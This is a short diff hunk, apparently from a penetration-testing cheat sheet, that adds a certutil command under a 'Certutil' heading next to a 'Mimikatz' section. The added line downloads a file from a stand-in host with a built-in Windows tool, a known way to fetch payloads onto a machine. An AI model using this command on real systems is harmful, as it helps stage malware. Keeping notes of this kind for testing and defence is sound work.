@@ -75,7 +75,7 @@ $ start
 
 ### Certutil
 ```bash
-
+certutil.exe -urlcache -f https://www.example.org/file.exe file.exe
 ```
 
 ### Mimikatz
